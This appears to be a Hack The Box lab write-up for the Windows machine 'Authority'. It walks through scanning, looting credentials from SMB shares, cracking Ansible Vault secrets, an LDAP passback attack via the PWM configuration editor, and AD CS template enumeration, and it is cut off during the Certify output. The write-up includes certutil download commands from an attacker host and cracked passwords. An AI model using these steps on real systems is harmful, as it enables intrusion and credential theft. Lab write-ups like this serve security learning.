---
tags:
  - AD-CS
  - ansible
  - PWM
  - ldap_passback
---
# HTB: Authority

***Overview**: Authority is a medium rated Windows machine that highlights the dangers of misconfigurations, password reuse, storing credentials on shares, and demonstrates how default settings in Active Directory (such as the ability for all domain users to add up to 10 computers to the domain) can be combined with other issues (vulnerable AD CS certificate templates) to take over a domain.*
## Scanning and Enumeration
- So we check for open ports using masscan 

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ sudo masscan -p1-65535 10.10.11.222 --rate=1000 -e tun0 > ports
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2023-08-18 06:05:49 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ cat ports                
Discovered open port 49717/tcp on 10.10.11.222                                 
Discovered open port 135/tcp on 10.10.11.222                                   
Discovered open port 139/tcp on 10.10.11.222                                   
Discovered open port 88/tcp on 10.10.11.222                                    
Discovered open port 49674/tcp on 10.10.11.222                                 
Discovered open port 636/tcp on 10.10.11.222                                   
Discovered open port 8443/tcp on 10.10.11.222                                  
Discovered open port 5985/tcp on 10.10.11.222                                  
Discovered open port 49666/tcp on 10.10.11.222                                 
Discovered open port 49694/tcp on 10.10.11.222                                 
Discovered open port 53/tcp on 10.10.11.222                                    
Discovered open port 80/tcp on 10.10.11.222                                    
Discovered open port 389/tcp on 10.10.11.222                                   
Discovered open port 9389/tcp on 10.10.11.222                                  
Discovered open port 593/tcp on 10.10.11.222                                   
Discovered open port 445/tcp on 10.10.11.222                                   
Discovered open port 47001/tcp on 10.10.11.222                                 
Discovered open port 3269/tcp on 10.10.11.222                                  
Discovered open port 464/tcp on 10.10.11.222                                   
Discovered open port 49689/tcp on 10.10.11.222                                 
Discovered open port 49665/tcp on 10.10.11.222                                 
Discovered open port 49691/tcp on 10.10.11.222                                 
Discovered open port 56698/tcp on 10.10.11.222                                 
Discovered open port 49693/tcp on 10.10.11.222                                 
Discovered open port 49705/tcp on 10.10.11.222                                 
Discovered open port 49703/tcp on 10.10.11.222                                 
Discovered open port 49667/tcp on 10.10.11.222                                 
```
- then we can  filter the ports and proceed to running a service scan using nmap

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')      
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ nmap -Pn -sV -sC -p$ports -oA nmap/authority_full 10.10.11.222 -v
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-18 02:15 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 02:15
Completed NSE at 02:15, 0.00s elapsed
Initiating NSE at 02:15
Completed NSE at 02:15, 0.00s elapsed
Initiating NSE at 02:15
Completed NSE at 02:15, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 02:15
Completed Parallel DNS resolution of 1 host. at 02:15, 0.00s elapsed
Initiating Connect Scan at 02:15
Scanning 10.10.11.222 [27 ports]
Discovered open port 139/tcp on 10.10.11.222
Discovered open port 135/tcp on 10.10.11.222
Discovered open port 80/tcp on 10.10.11.222
Discovered open port 445/tcp on 10.10.11.222
Discovered open port 53/tcp on 10.10.11.222
Discovered open port 49689/tcp on 10.10.11.222
Discovered open port 49705/tcp on 10.10.11.222
Discovered open port 49674/tcp on 10.10.11.222
Discovered open port 49667/tcp on 10.10.11.222
Discovered open port 9389/tcp on 10.10.11.222
Discovered open port 49665/tcp on 10.10.11.222
Discovered open port 47001/tcp on 10.10.11.222
Discovered open port 636/tcp on 10.10.11.222
Discovered open port 389/tcp on 10.10.11.222
Discovered open port 49666/tcp on 10.10.11.222
Discovered open port 593/tcp on 10.10.11.222
Discovered open port 49703/tcp on 10.10.11.222
Discovered open port 8443/tcp on 10.10.11.222
Discovered open port 49691/tcp on 10.10.11.222
Discovered open port 464/tcp on 10.10.11.222
Discovered open port 49717/tcp on 10.10.11.222
Discovered open port 49693/tcp on 10.10.11.222
Discovered open port 3269/tcp on 10.10.11.222
Discovered open port 5985/tcp on 10.10.11.222
Discovered open port 49694/tcp on 10.10.11.222
Discovered open port 56698/tcp on 10.10.11.222
Discovered open port 88/tcp on 10.10.11.222
Completed Connect Scan at 02:15, 0.35s elapsed (27 total ports)
Initiating Service scan at 02:15
Scanning 27 services on 10.10.11.222
Service scan Timing: About 55.56% done; ETC: 02:16 (0:00:30 remaining)
Completed Service scan at 02:16, 63.12s elapsed (27 services on 1 host)
NSE: Script scanning 10.10.11.222.
Initiating NSE at 02:16
Completed NSE at 02:16, 11.61s elapsed
Initiating NSE at 02:16
Completed NSE at 02:16, 2.90s elapsed
Initiating NSE at 02:16
Completed NSE at 02:16, 0.03s elapsed
Nmap scan report for 10.10.11.222
Host is up (0.17s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-18 10:15:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-08-18T10:16:23+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-08-18T10:16:24+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2023-08-18T10:16:24+00:00; +3h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:   d49477106f6b8100e4e19cf2aa40dae1
|_SHA-1: ddedb994b80c83a9db0be7d35853ff8e54c62d0b
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Fri, 18 Aug 2023 10:15:21 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=ISO-8859-1
|     Content-Length: 82
|     Date: Fri, 18 Aug 2023 10:15:19 GMT
|     Connection: close
|     <html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, OPTIONS
|     Content-Length: 0
|     Date: Fri, 18 Aug 2023 10:15:19 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1936
|     Date: Fri, 18 Aug 2023 10:15:27 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-16T08:11:14
| Not valid after:  2025-08-17T19:49:38
| MD5:   42e94faba2d9688da34ba424535c0b3e
|_SHA-1: 8265cf9c1dfb51a17d19c244fbaea5b2dd47535e
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49717/tcp open  msrpc         Microsoft Windows RPC
56698/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=8/18%Time=64DF0C78%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;c
SF:harset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\x2018\x20Au
SF:g\x202023\x2010:15:19\x20GMT\r\nConnection:\x20close\r\n\r\n\n\n\n\n\n<
SF:html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;URL='/pwm'\"/
SF:></head></html>")%r(HTTPOptions,7D,"HTTP/1\.1\x20200\x20\r\nAllow:\x20G
SF:ET,\x20HEAD,\x20POST,\x20OPTIONS\r\nContent-Length:\x200\r\nDate:\x20Fr
SF:i,\x2018\x20Aug\x202023\x2010:15:19\x20GMT\r\nConnection:\x20close\r\n\
SF:r\n")%r(FourOhFourRequest,DB,"HTTP/1\.1\x20200\x20\r\nContent-Type:\x20
SF:text/html;charset=ISO-8859-1\r\nContent-Length:\x2082\r\nDate:\x20Fri,\
SF:x2018\x20Aug\x202023\x2010:15:21\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n\n\n\n\n<html><head><meta\x20http-equiv=\"refresh\"\x20content=\"0;UR
SF:L='/pwm'\"/></head></html>")%r(RTSPRequest,82C,"HTTP/1\.1\x20400\x20\r\
SF:nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\
SF:nContent-Length:\x201936\r\nDate:\x20Fri,\x2018\x20Aug\x202023\x2010:15
SF::27\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20la
SF:ng=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20
SF:Request</title><style\x20type=\"text/css\">body\x20{font-family:Tahoma,
SF:Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;background
SF:-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16px;}\
SF:x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color:bla
SF:ck;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;}</s
SF:tyle></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20R
SF:equest</h1><hr\x20class=\"line\"\x20/><p><b>Type</b>\x20Exception\x20Re
SF:port</p><p><b>Message</b>\x20Invalid\x20character\x20found\x20in\x20the
SF:\x20HTTP\x20protocol\x20\[RTSP&#47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><
SF:b>Description</b>\x20The\x20server\x20cannot\x20or\x20will\x20not\x20pr
SF:ocess\x20the\x20request\x20due\x20to\x20something\x20that\x20is\x20perc
SF:eived\x20to\x20be\x20a\x20client\x20error\x20\(e\.g\.,\x20malformed\x20
SF:request\x20syntax,\x20invalid\x20");
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-18T10:16:14
|_  start_date: N/A
|_clock-skew: mean: 3h59m58s, deviation: 0s, median: 3h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

```
#### Port 80
- From our port scan, we see Port 80 open, if we go there, we have our default IIS server page

![](assets/Authority_assets/Pasted%20image%2020230818070732.png)

- we can try inspecting the page as well but there isn't any useful information found there

#### RPC: 135

- I try to enumerate users using RPC but I got an access denied error

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ rpcclient -U "" -N 10.10.11.222              
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED

```
#### SMB: 139/445

- Moving to SMB, I list the shares using `smbclient`

```shell
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\10.10.11.222\\ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

- then check the access permissions of each share using 
`enum4linux -a -u "" -p "" 10.10.11.222 && enum4linux -a -u "guest" -p "" 10.10.11.222`

![](assets/Authority_assets/Pasted%20image%2020230818085331.png)

-  basically we have read access on 2 shares which are Department Shares and Development  
- Enumerating the Development share, I download the whole share

```shell
┌──(kali㉿kali)-[~/PNPT/machines/smb]
└─$ smbclient  \\\\10.10.11.222\\Development -N 
Try "help" to get a list of possible commands.
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *

**SNIP**
┌──(kali㉿kali)-[~/PNPT/machines/smb]
└─$ cd Automation
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines/smb/Automation]
└─$ ls
Ansible
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines/smb/Automation]
└─$ tree         
.
└── Ansible
    ├── ADCS
    │   ├── defaults
    │   │   └── main.yml
    │   ├── LICENSE
    │   ├── meta
    │   │   ├── main.yml
    │   │   └── preferences.yml
    │   ├── molecule
    │   │   └── default
    │   │       ├── converge.yml
    │   │       ├── molecule.yml
    │   │       └── prepare.yml
    │   ├── README.md
    │   ├── requirements.txt
    │   ├── requirements.yml
    │   ├── SECURITY.md
    │   ├── tasks
    │   │   ├── assert.yml
    │   │   ├── generate_ca_certs.yml
    │   │   ├── init_ca.yml
    │   │   ├── main.yml
    │   │   └── requests.yml
    │   ├── templates
    │   │   ├── extensions.cnf.j2
    │   │   └── openssl.cnf.j2
    │   ├── tox.ini
    │   └── vars
    │       └── main.yml
    ├── LDAP
    │   ├── defaults
    │   │   └── main.yml
    │   ├── files
    │   │   └── pam_mkhomedir
    │   ├── handlers
    │   │   └── main.yml
    │   ├── meta
    │   │   └── main.yml
    │   ├── README.md
    │   ├── tasks
    │   │   └── main.yml
    │   ├── templates
    │   │   ├── ldap_sudo_groups.j2
    │   │   ├── ldap_sudo_users.j2
    │   │   ├── sssd.conf.j2
    │   │   └── sudo_group.j2
    │   ├── TODO.md
    │   ├── Vagrantfile
    │   └── vars
    │       ├── debian.yml
    │       ├── main.yml
    │       ├── redhat.yml
    │       └── ubuntu-14.04.yml
    ├── PWM
    │   ├── ansible.cfg
    │   ├── ansible_inventory
    │   ├── defaults
    │   │   └── main.yml
    │   ├── handlers
    │   │   └── main.yml
    │   ├── meta
    │   │   └── main.yml
    │   ├── README.md
    │   ├── tasks
    │   │   └── main.yml
    │   └── templates
    │       ├── context.xml.j2
    │       └── tomcat-users.xml.j2
    └── SHARE
        └── tasks
            └── main.yml

26 directories, 46 files

```
- Looking through files in the share, I discover various credentials different files
- Looking at the tomcat-users xml file, I find some credentials

![](assets/Authority_assets/Pasted%20image%2020230818085505.png)

- there is also a file known as ansible_inventory that has credentials as well

![](assets/Authority_assets/Pasted%20image%2020230818125349.png)

- I also discover Ansible hashes in a yml file

![](assets/Authority_assets/Pasted%20image%2020230818221131.png)

- Using google I discover a guide on cracking Ansible Vault hashes at [Cracking Ansible Vault Secrets with Hashcat (bengrewell.com)](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/) 
- Following this guide I was able to get the cracked secret

![](assets/Authority_assets/Pasted%20image%2020230818221210.png)

- Placing each ansible vault hash in a file, I then convert it into a JtR hash format for cracking.

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ ansible2john credentials.vault > credentials.hash                              
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ cat credentials.hash                            
credentials.vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

- using hashcat on my windows worksation, I then crack the hash usign the syntax `hashcat.exe -m 16900 -O -a 0 -w 4 "hashes_to _crack\hash.txt" rockyou.txt -O ` and get the vault secret as `!@#$%^&*`

![](assets/Authority_assets/Pasted%20image%2020230818221607.png)

- The reset of the guide required the ansible vault to obtain the string, but since I only found the hash, I had to use google once more
- Then I found a guide at [Ansible Vault: Encrypt | Decrypt a String - ShellHacks](https://www.shellhacks.com/ansible-vault-encrypt-decrypt-string/) and following this guide below

![](assets/Authority_assets/Pasted%20image%2020230818221704.png)

- I used `ansible-vault` tool to decrypt the hash, then I entered the password that I got using hashcat which was `!@#$%^&*` ,  and doing this on all 3 of the ansible vault hashes found, I obtained their clear text

```shell
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ ansible-vault decrypt
Vault password: 
Reading ciphertext input from stdin
$ANSIBLE_VAULT;1.1;AES256
326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438

Decryption successful
svc_pwm                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ 
                                                                                                                                                                       
┌──(kali㉿kali)-[~/PNPT/machines]
└─$ ansible-vault decrypt
Vault password: 
Reading ciphertext input from stdin
$ANSIBLE_VAULT;1.1;AES256
313563383439633230633734353632613235633932356333653561346162616664333932633737363335616263326464633832376261306131303337653964350a363663623132353136346631396662386564323238303933393362313736373035356136366465616536373866346138623166383535303930356637306461350a3164666630373030376537613235653433386539346465336633653630356531
Decryption successful
pWm_@dm!N_!23 

┌──(kali㉿kali)-[~/PNPT/machines]
└─$ ansible-vault decrypt                                          
Vault password: 
Reading ciphertext input from stdin
$ANSIBLE_VAULT;1.1;AES256
633038313035343032663564623737313935613133633130383761663365366662326264616536303437333035366235613437373733316635313530326639330a643034623530623439616136363563346462373361643564383830346234623235313163336231353831346562636632666539383333343238343230333633350a6466643965656330373334316261633065313363363266653164306135663764

Decryption successful
DevT3st@123                                                                                                                                                               
```
#### Port 8443
- 8443 is HTTPS for tomcat

```ad-note
Tomcat listens on **port 8080 for HTTP, port 8443 for https** and **port 8009 for AJP.**
```

- When I moved to port 8443, the page kept redirecting me to a `/pwm` directory
-  At first I kept encountering this error but later on after the machine was reset, it was fine

![](assets/Authority_assets/Pasted%20image%2020230818070930.png)

##### A Bit of Research
- Searching what PWM is, we saw that [PWM]([pwm-project/pwm: pwm (github.com)](https://github.com/pwm-project/pwm)) is an open source  password self-service application for LDAP directories
- Researching further, on the page [Automate password resets with PWM | Opensource.com](https://opensource.com/article/19/4/automate-password-resets-pwm), it stated that 
> [PWM](https://github.com/pwm-project/pwm) is an open source application that provides a webpage where users can submit their own password resets.
>  If certain conditions are met, which you can configure, PWM will send a password reset instruction to whichever directory service you've connected it to.
>  PWM works with any implementation of LDAP and written to run on Apache Tomcat

- so now we know why its running on port 8443
- I also learnt about SSPR ( Self Service Password Reset), which is Microsoft's own password reset tool
##### 8443 Cont.
- Going to the port 8443, the login page was displayed, and this also specified that we are in the configuration mode, and this states that in this mode , we are allowed to update the configuration without authenticating to the LDAP directory.

![](assets/Authority_assets/Pasted%20image%2020230818110755.png)

- So when I clicked on the Editor, I was asked to provide a Password

![](assets/Authority_assets/Pasted%20image%2020230818112204.png)

- I tried different passwords found like the tomcat credentials of earlier but it didn't work and showed the error code 5089 (SSPR Error code), googling the code I found the meaning as "Wrong Password" at [List of SSPR Error Codes (microfocus.com)](https://support.microfocus.com/kb/doc.php?id=7015920)

![](assets/Authority_assets/Pasted%20image%2020230818131955.png)

- Looking at the logs of the previous authentications that were being shown on the site, I noticed that users could login with just the password, I also noticed the user `svc_pwm`

- when I then tried the password `pWm_@dm!N_!23` (which is the password for svc_pwm we cracked earlier), I got the error below

![](assets/Authority_assets/Pasted%20image%2020230818222002.png)

- then clicking continue, I got access to the PWM portal!
- I could view the configuration editor

![](assets/Authority_assets/Pasted%20image%2020230818222222.png)

- And I could also view the configuration manager

![](assets/Authority_assets/Pasted%20image%2020230818222255.png)

#### Exploitation
##### LDAP Passback Attack Overview

- So understanding that this PWM service utilizes LDAP authentication and also a web facing application in this machine , then I think to myself can I capture LDAP Bind credentials using an LDAP Passback attack?, since I now have access to the configuration Editor
- LDAP Passback attack: In an LDAP Pass-back attack, the **attacker changes the IP address or hostname of the LDAP server in the device’s configuration**. The attacker sets this information to their own IP and tests the configuration. This causes the device to make an authentication attempt using LDAP to the attacker’s fake device.
- LDAP Pass-back attacks occur when a person gains access to the configuration settings of a device where the LDAP (Lightweight Directory Access Protocol) information is specified. An example of such a device is a network printer with a web interface

##### Exploitation cont.
- so on the configuration editor, I went to the configurations settings and then modified the LDAP URLs to the IP address of my attack machine like change from ` ldaps://authority.authority.htb:636` to `ldaps://10.10.14.34:389`

![](assets/Authority_assets/Pasted%20image%2020230818222606.png)

- then in my Netcat listener, I receive a connection and also what looks like credentials `svc_ldap` and `lDaP_1n_th3_cle4r!`

![](assets/Authority_assets/Pasted%20image%2020230818223500.png)

- I can try to list users using `impacket-GetADUsers` with these credentials and it worked

![](assets/Authority_assets/Pasted%20image%2020230818233243.png)

- Psexec or Wmiexec does not work with the credentials though because it doesn't have administrative access
- so I use winrm to connect using `evil-winrm` and I finally gain foothold

![](assets/Authority_assets/Pasted%20image%2020230819194257.png)

- And I was able to read the User flag

![](assets/Authority_assets/Pasted%20image%2020230823193021.png)

#### Privilege Escalation

- so I check all the permissions I have using the `whoami /all` command

```shell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

- I transferred the winpeas script and ran it
`certutil.exe -urlcache -split -f http://10.10.14.58/winPEASx86.exe winPEASx64.exe`
- I also transferred the adPEAS script `certutil.exe -urlcache -split -f http://10.10.14.221/adPEAS.exe adPEAS.ps1
-  and ran it as well 

```shell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> . ./adPEAS.ps1
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-adPEAS

```
- from the output of adPEAS, I saw that an AD CS service name AUTHORITY-CA was on the domain

![](assets/Authority_assets/Pasted%20image%2020230820155230.png)

- I also saw that this AD CS service had a vulnerable template known as CordVPN, and this template had this `ENROLLEE_SUPPLIES_SUBJECT` flag 

![](assets/Authority_assets/Pasted%20image%2020230820160015.png)

- Doing some googling, from [AD Certificate Services: Risky Settings and Their Remediation (netwrix.com)](https://blog.netwrix.com/2021/08/24/active-directory-certificate-services-risky-settings-and-how-to-remediate-them/#SnippetTab) I saw that
> When the flag CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is present in the [mspki-certificate-name-flag](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/1192823c-d839-4bc3-9b6b-fa8c53507ae1) property, the enrollee of the certificate can supply their own alternative Subject Name in the certificate signing request. This means that any user who is allowed to enroll in a certificate with this setting can request a certificate as any user in the network, including a privileged user.

- we can also run the certify.exe script to find vulnerable templates

```shell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> ./Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
